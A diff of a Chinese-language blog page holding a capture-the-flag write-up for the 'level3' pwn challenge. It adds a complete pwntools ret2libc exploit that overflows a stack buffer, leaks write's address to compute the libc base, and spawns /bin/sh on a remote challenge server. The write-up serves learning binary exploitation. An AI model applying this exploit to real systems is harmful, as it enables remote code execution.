@@ -29,7 +29,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2021/03/27/AD-level3/1.jpg">
 <meta property="article:published_time" content="2021-03-27T05:28:44.000Z">
-<meta property="article:modified_time" content="2021-04-08T09:01:23.339Z">
+<meta property="article:modified_time" content="2021-04-08T14:05:56.239Z">
 <meta property="article:author" content="带废物">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -128,7 +128,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">29</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">30</span></a>
 
   </li>
   </ul>
@@ -189,7 +189,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-08 17:01:23" itemprop="dateModified" datetime="2021-04-08T17:01:23+08:00">2021-04-08</time>
+                <time title="Modified: 2021-04-08 22:05:56" itemprop="dateModified" datetime="2021-04-08T22:05:56+08:00">2021-04-08</time>
               </span>
 
           
@@ -215,11 +215,13 @@
 <p>libc动态库：存放自带的可调用的功能性函数。</p>
 <img src="/2021/03/27/AD-level3/1.jpg" class>
 <h1 id="新增python、pwntools内容"><a href="#新增python、pwntools内容" class="headerlink" title="新增python、pwntools内容"></a>新增python、pwntools内容</h1><p>相关内容已经更新在“pwn用到的工具汇总”</p>
-<h1 id="边学边做"><a href="#边学边做" class="headerlink" title="边学边做"></a>边学边做</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<h1 id="边学边做"><a href="#边学边做" class="headerlink" title="边学边做"></a>边学边做</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">63111</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got_addr)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>
 <p>现在程序执行到read函数中间<br>136个‘a’覆盖buf<br>再覆盖read函数中 存放母函数的ebp<br>接下来覆盖其返回地址为write_plt</p>
-<p>程序执行到read函数的ret，清空栈内包括write_plt之前的所有东西，跳转到write_plt</p>
-<p>对于write_plt<br>main_addr成了它的返回地址<br>1，write_got，4，成了它的参数</p>
-<p>于是成功泄露了write_got_addr，并返回main函数，用于其它操作。<br>即使这里main_addr改为其它地址，仍然成功能泄露write_got_addr。</p>
+<p>程序执行到read函数的ret，清空栈内包括write_plt_addr之前的所有东西，跳转到write_plt_addr</p>
+<p>对于write_plt_addr<br>main_addr成了它的返回地址<br>1，write_got_addr，4，成了它的参数</p>
+<p>于是通过write_got_addr成功泄露了write_got，并返回main函数，用于其它操作。<br>即使这里main_addr改为其它地址，仍然成功能泄露write_got_addr。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">63111</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got_addr)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got = u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc_base = write_got - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line">payload2=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>p32()将数据打包成4位字节的其它形式，相应的u32只能解包4个字节的数据<br>libc中函数名地址可直接查出，但具体执行地址在哪执行不知道<br>通过libc中write的函数名地址和执行地址，算出相对偏移</p>
 
     </div>
 
@@ -317,7 +319,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
